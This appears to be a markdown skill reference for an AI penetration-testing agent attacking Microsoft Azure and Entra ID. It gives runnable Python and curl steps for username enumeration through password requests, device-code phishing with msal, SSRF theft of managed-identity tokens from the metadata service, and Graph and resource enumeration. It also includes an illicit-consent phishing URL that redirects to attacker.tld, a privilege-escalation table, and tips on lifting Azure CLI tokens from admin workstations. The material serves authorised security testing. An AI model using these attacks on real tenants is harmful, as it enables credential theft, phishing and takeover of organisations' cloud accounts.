---
name: Azure Pentesting
description: Reference for Azure / Entra ID attacks covering tenant enumeration, token forging, Managed Identity abuse, Logic Apps misconfig, Azure AD application consent, OAuth flows, and SSRF-to-cloud chains.
---

# Azure Pentesting

Reference for testing Microsoft Azure and Entra ID (formerly Azure AD) targets. Pull this in when the target uses Azure AD for identity, hosts on Azure VMs / App Service / Functions / AKS, or you have Azure tokens / refresh tokens / app-secret credentials.

> Black-box scope: probes drive the public Azure REST APIs via the `msal` / `azure-identity` / `azure-mgmt-resource` Python SDKs (now installed). Azure CLI (`az`) and ROADtools are NOT in the image; the SDKs cover every probe in this skill.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Programmatic Azure API | `execute_code` | `azure-identity` for token acquisition, `azure-mgmt-*` for resource calls. |
| Tenant / app discovery | `execute_curl` | Public Microsoft endpoints (`login.microsoftonline.com`, `graph.microsoft.com`). |
| OAuth flow capture | `execute_playwright` | Drive consent / device-code flows. |
| IMDS abuse on Azure VMs | `execute_curl` | `http://169.254.169.254/metadata/...` (different shape than AWS). |
| JWT triage | `kali_shell jwt_tool` + `/skill jwt_attacks` |  |

## Recon: pre-credential

### Tenant enumeration

```
GET https://login.microsoftonline.com/<tenant-id-or-domain>/.well-known/openid-configuration
GET https://login.microsoftonline.com/getuserrealm.srf?login=user@target.tld&xml=1
GET https://login.microsoftonline.com/common/userrealm/user@target.tld?api-version=2.1
```

The `getuserrealm.srf` endpoint is unauthenticated and reveals:

- `NameSpaceType`: `Managed` (Azure-hosted), `Federated` (ADFS), `Unknown` (no tenant).
- `DomainName`: the tenant's primary domain.
- `FederationBrandName`: the tenant's display name.
- `AuthURL`: the federation endpoint (for ADFS-backed tenants).

```
execute_curl url: "https://login.microsoftonline.com/getuserrealm.srf?login=alice@target.tld&xml=1"
```

### User enumeration

`GET https://login.microsoftonline.com/common/oauth2/v2.0/authorize?...` returns subtly different errors based on whether a username exists or not. Several public tools (`o365creeper`, `MSOLSpray`) automate this. Reproducible via:

```python
execute_code language: python
import requests
# Submit a malformed OAuth request and observe error codes
url = "https://login.microsoftonline.com/common/oauth2/token"
for u in ["alice@target.tld","bob@target.tld","fakeuser@target.tld"]:
    r = requests.post(url, data={
        "grant_type":"password","username":u,"password":"x",
        "client_id":"1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Office
        "resource":"https://graph.microsoft.com/"
    })
    err = r.json().get("error_description","")
    # AADSTS50034 = no such user; AADSTS50126 = user exists, wrong password
    print(u, "exists" if "AADSTS50126" in err or "AADSTS50053" in err or "AADSTS50057" in err else "no")
```

Common error codes:

| Code | Meaning |
|---|---|
| AADSTS50034 | User does not exist |
| AADSTS50126 | Wrong password (user exists) |
| AADSTS50053 | Account locked |
| AADSTS50057 | User account disabled |
| AADSTS50079 | MFA required (user exists, password correct) |
| AADSTS50097 | Device authentication required |
| AADSTS50158 | External security challenge required |

`AADSTS50126` and `AADSTS50079` confirm a valid user.

### Tenant ID resolution

```
GET https://login.microsoftonline.com/<domain>/.well-known/openid-configuration
```

The `issuer` field (`https://sts.windows.net/<tenant-id>/`) reveals the tenant UUID.

### Public app enumeration

Multi-tenant Azure AD applications (the `1b730954-...` and similar) can sign in to ANY tenant. Knowing public client IDs lets you forge consent requests for any target tenant.

## Authentication: capturing tokens

| Method | How |
|---|---|
| Username + password (legacy ROPC) | `POST /common/oauth2/token` grant_type=password |
| Device code | `POST /common/oauth2/devicecode`, prompt user to approve |
| Authorization code | Standard OAuth flow via browser |
| Refresh token | Long-lived; can be exchanged for any audience |
| Service-principal app secret | client_credentials grant |
| Service-principal certificate | client_assertion via JWT |
| Managed Identity (on an Azure VM) | IMDS: `http://169.254.169.254/metadata/identity/oauth2/token` |

```python
execute_code language: python
import msal
app = msal.PublicClientApplication("1b730954-1685-4b74-9bfd-dac224a7b894",
                                    authority="https://login.microsoftonline.com/<tenant>")
flow = app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
print(flow["message"])     # show user the verification URL + code
result = app.acquire_token_by_device_flow(flow)
print(result["access_token"][:40], "...")
```

Device-code phishing: send the user the URL + code. They authenticate; you get the token.

## Managed Identity (Azure VM IMDS)

Azure VMs have an instance metadata service at `169.254.169.254/metadata`. Different shape from AWS.

```
GET http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header: Metadata: true
GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
  Header: Metadata: true
```

The `Metadata: true` header is required. Without it, the IMDS rejects -- which is also what blocks naive SSRF.

```
execute_curl url: "https://target.tld/api/preview?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/"
# But the SSRF must inject the Metadata: true header. Many SSRF surfaces cannot.
# Workaround: the SSRF surface must allow custom headers, OR there's a proxy app that adds it.
```

The captured token is for the resource URL specified (`https://management.azure.com/`, `https://graph.microsoft.com/`, `https://vault.azure.net/`, etc.). Use it via `Authorization: Bearer <token>`.

## Microsoft Graph

The Microsoft Graph API (`https://graph.microsoft.com/v1.0/...`) is the primary control-plane.

```python
execute_code language: python
import requests
H = {"Authorization": f"Bearer {TOKEN}"}
print(requests.get("https://graph.microsoft.com/v1.0/me", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/users", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/groups", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/applications", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/servicePrincipals", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/directoryRoles", headers=H).json())
print(requests.get("https://graph.microsoft.com/v1.0/devices", headers=H).json())
```

### Privilege identification

```python
# What roles does the current user have?
print(requests.get("https://graph.microsoft.com/v1.0/me/memberOf", headers=H).json())

# Privileged-role members (Global Admin, Privileged Role Admin, etc.)
roles = requests.get("https://graph.microsoft.com/v1.0/directoryRoles", headers=H).json()["value"]
for r in roles:
    if r["displayName"] in ("Global Administrator","Privileged Role Administrator","Application Administrator"):
        members = requests.get(f"https://graph.microsoft.com/v1.0/directoryRoles/{r['id']}/members", headers=H).json()
        print(r["displayName"], [m["userPrincipalName"] for m in members["value"]])
```

## Azure Resource Manager (ARM)

```python
execute_code language: python
import requests
H = {"Authorization": f"Bearer {ARM_TOKEN}"}     # token resource = https://management.azure.com/
SUB = "<subscription-id>"
print(requests.get(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01", headers=H).json())
print(requests.get(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Storage/storageAccounts?api-version=2022-09-01", headers=H).json())
print(requests.get(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01", headers=H).json())
```

## Privilege escalation paths

| If you have | Escalate via |
|---|---|
| `Application Administrator` role | Add credentials (secret) to a Service Principal of a high-privileged app |
| `Cloud Application Administrator` | Same for cloud apps |
| `Privileged Authentication Administrator` | Reset MFA / passwords for any user including Global Admins |
| `Hybrid Identity Administrator` | Manipulate sync; chain to on-prem AD |
| Owner of a subscription | Add Contributor / Owner role assignments |
| `Microsoft.Authorization/roleAssignments/write` | Direct role assignment |
| Service Principal with `RoleManagement.ReadWrite.Directory` | Promote any principal |
| Access to a Key Vault with `secrets/get` | Read all stored secrets including app credentials |
| Compromised Service Principal certificate | Sign as that SP indefinitely |
| `Microsoft.Storage/storageAccounts/listKeys/action` | Get storage account keys; full data-plane access |
| Logic App with managed identity | Modify the workflow to run arbitrary actions as the MI |
| Function App with elevated MI | Replace function code; run as the MI |
| Automation Account "RunAs" | Execute PowerShell as the configured identity |

The canonical reference is NetSPI's "Maintaining Persistence in Azure" series and the BloodHound (Azure / Entra) edge documentation. ROADtools enumerates these systematically; without ROADtools, walk the Graph + ARM endpoints listed above.

## Specific high-value targets

### Storage Account

```
https://<account>.blob.core.windows.net/        (Blob)
https://<account>.file.core.windows.net/        (Files)
https://<account>.table.core.windows.net/        (Tables)
https://<account>.queue.core.windows.net/        (Queues)
```

Anonymous access (when public):

```
execute_curl url: "https://<account>.blob.core.windows.net/<container>?restype=container&comp=list"
execute_curl url: "https://<account>.blob.core.windows.net/<container>/<blob>"
```

SAS-token URL replay:

```
https://<account>.blob.core.windows.net/<container>/<blob>?sv=2022-...&sig=...&se=...
```

Capture from logs / leaks; replay across users / paths if the SAS is overly broad.

Account-key abuse via `listKeys`:

```python
import requests
# Convert listKeys output to direct REST auth via shared key signing
```

### Key Vault

```
https://<vault>.vault.azure.net/secrets?api-version=7.4
https://<vault>.vault.azure.net/secrets/<name>?api-version=7.4
https://<vault>.vault.azure.net/keys?api-version=7.4
https://<vault>.vault.azure.net/certificates?api-version=7.4
```

Token resource = `https://vault.azure.net/`. With `secrets/get` permission, every secret is exposed.

### App Service / Function Apps

`https://<app>.azurewebsites.net/`

- Look for `/.git/`, `/.env`, `web.config`, `Web.config.bak`, `.publishsettings` (deployment credentials).
- Kudu console at `https://<app>.scm.azurewebsites.net/` (when accessible) gives full file-system + shell.
- Function URL with `code=<key>` query param is the auth; long-lived keys leak via env / deployment artifacts.

### Logic Apps

```python
print(requests.get(f"{ARM}/subscriptions/{SUB}/providers/Microsoft.Logic/workflows?api-version=2019-05-01", headers=H).json())
```

Logic Apps with HTTP triggers and managed identity often expose unauth-callable URLs. Read the workflow definition for the trigger URL + signature key.

### Cognitive Services / OpenAI

API keys leak in app secrets. Check `Microsoft.CognitiveServices` resources:

```python
print(requests.get(f"{ARM}/.../Microsoft.CognitiveServices/accounts/<name>/listKeys?api-version=2022-12-01", headers=H, timeout=10))
```

## Application consent abuse (illicit consent grant)

Multi-tenant app registered in attacker tenant, with permissions like `Mail.ReadWrite`. Phish the victim with the consent URL:

```
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
  client_id=<attacker-app-id>&
  response_type=code&
  redirect_uri=https://attacker.tld/cb&
  scope=openid offline_access Mail.ReadWrite
```

Victim grants consent (sometimes admin-grants for the whole tenant). Attacker app now has persistent Graph access. Remediated only when victim revokes the app consent.

## nOAuth (Microsoft-flavored)

Multi-tenant Entra apps where the relying party keys local accounts on `email` / `preferred_username` rather than the immutable `oid`/`sub`. Attacker tenant sets `email=victim@target.tld`; sign in to RP; land in victim's account.

See `/skill oauth_oidc` for the broader nOAuth / mix-up matrix.

## Validation shape

A clean Azure finding includes:

1. The credential / token source (device-code phish, leaked secret, IMDS abuse via SSRF, etc.).
2. `GET /v1.0/me` output proving the principal.
3. Tenant ID and the subscription ID accessed.
4. The specific resource accessed (storage account, key vault, app service, etc.).
5. For role escalation: the chain (e.g. App Admin -> add SP secret -> SP holds higher role -> escalate).
6. Sample of leaked data with sensitive fields redacted.

## False positives

- IMDS reachable but every captured token has zero permissions (Managed Identity not assigned a role).
- Storage account public list returns 404 / 403 for every container.
- Graph token has `User.Read` only -- single-user read access.
- Key Vault accessible but RBAC denies `get`/`list`.
- Service Principal exists but is disabled.

## Tooling status

The brief lists `ROADtools (roadrecon)`, `azurehound`, `MicroBurst`, `AADInternals`, `Azure CLI` as missing. The agent uses `msal` + `azure-identity` + `azure-mgmt-resource` (now installed) plus direct Graph / ARM REST calls. ROADtools is the gold standard for Entra-side enumeration; if the engagement specifically requires its output, the operator can run ROADtools separately.

## Hand-off

```
Token captured                  -> Graph / ARM enumeration via this skill
Storage account public access    -> /skill information_disclosure
Logic App HTTP trigger           -> /skill information_disclosure (signature-key leak)
JWT issued by Entra              -> /skill jwt_attacks
OAuth / device-code phishing      -> /skill oauth_oidc
nOAuth attribute hijack           -> /skill oauth_oidc
On-prem AD via Hybrid Identity Admin -> /skill ad_kill_chain (built-in AD attack chain)
```

## Pro tips

- The first probe is always `getuserrealm.srf` against any user@target.tld -- it reveals tenant type without authenticating.
- Device-code phishing is the highest-impact social vector against Entra. The target sees a legitimate Microsoft URL and approves; attacker holds a long-lived refresh token afterward.
- Refresh tokens for Azure CLI / Microsoft 365 client IDs grant access to most Microsoft APIs because they request `.default` scope, which expands to the app's full assigned permissions.
- The `oid` claim (object ID) is the immutable user identity. Never key local accounts on `email` / `preferred_username` or you create an nOAuth chain.
- App Service `Kudu` console (`<app>.scm.azurewebsites.net`) is a classic forgotten-deployment-tool surface; if reachable, full RCE.
- Logic Apps + Managed Identity is a common implicit-trust path: modify the workflow definition (if you have Contributor on the resource group) and you run as the MI.
- Azure CLI tokens (when leaked from `~/.azure/` of compromised admin workstations) have `aud=https://management.azure.com/` and `appid=04b07795-8ddb-461a-bbee-02f9e1bf7b46` (the well-known Azure CLI client). They are very long-lived in practice.
- For ADFS-backed tenants, the federation endpoint (revealed in `getuserrealm.srf`) becomes the next target; consider Golden SAML if the ADFS server is reachable.
